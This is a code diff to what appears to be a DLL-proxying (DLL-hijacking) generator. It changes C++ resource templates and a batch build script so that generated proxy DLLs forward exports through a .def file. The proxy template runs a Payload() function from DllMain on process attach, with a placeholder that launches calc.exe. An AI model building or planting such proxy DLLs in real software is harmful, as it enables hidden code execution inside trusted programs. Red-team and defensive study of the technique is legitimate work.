@@ -121,65 +121,36 @@
     <value>#pragma once
     
 //%_BUILD_AS%
-%_PRAGMA_COMMENTS_%
 
 #include &lt;windows.h&gt;
-#include &lt;string&gt;
-#ifdef ADD_EXPORTS
-#include "%_BASENAME_%.h"
-#endif
 
+extern "C" {
 
-VOID Payload() {
-    // Run your payload here.
-    WinExec("calc.exe", 1);
+  VOID Payload() {
+      // Run your payload here.
+      WinExec("calc.exe", 1);
+  }
+
+  BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+  {
+      switch (fdwReason)
+      {
+      case DLL_PROCESS_ATTACH:
+          Payload();
+          break;
+      case DLL_THREAD_ATTACH:
+          break;
+      case DLL_THREAD_DETACH:
+          break;
+      case DLL_PROCESS_DETACH:
+          break;
+      }
+      return TRUE;
+  }
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
-{
-    switch (fdwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        Payload();
-        break;
-    case DLL_THREAD_ATTACH:
-        break;
-    case DLL_THREAD_DETACH:
-        break;
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
-#ifdef ADD_EXPORTS
-%_EXPORTS_%
-#endif
-</value>
-  </data>
-  <data name="proxy.dll.h" xml:space="preserve">
-    <value>/* You should define ADD_EXPORTS *only* when building the DLL. */
-#ifdef ADD_EXPORTS
-  #define ADDAPI __declspec(dllexport)
-#else
-  #define ADDAPI __declspec(dllimport)
-#endif
-
-/* Define calling convention in one place, for convenience. */
-#define ADDCALL __cdecl
-
-/* Make sure functions are exported with C linkage under C++ compilers. */
-
-#ifdef __cplusplus
-extern "C"
-{
-#endif
-
-/* Declare our Add function using the above definitions. */
 %_EXPORTS_%
 
-#ifdef __cplusplus
-} // __cplusplus defined.
-#endif
 </value>
   </data>
   <data name="proxy.dll.def" xml:space="preserve">
@@ -207,11 +178,11 @@ FOR %%? IN (path.txt) DO ( SET /A strlength=%%~z? - 2 )
 if %strlength% GEQ 5500 goto vcvarserr
 call "%VCINSTALLDIR%\Auxiliary\Build\vcvarsall.bat" x86
 for /f %%f in ('findstr /m /c:"//BUILD_AS_32" *.cpp') do (
-    cl /LD %%f
+    cl /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link /DEF:%%~nf.def
 )
 call "%VCINSTALLDIR%\Auxiliary\Build\vcvars32.bat" amd64
 for /f %%f in ('findstr /m /c:"//BUILD_AS_64" *.cpp') do (
-    cl /LD %%f
+    cl /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link /DEF:%%~nf.def
 )
 goto :eof
 
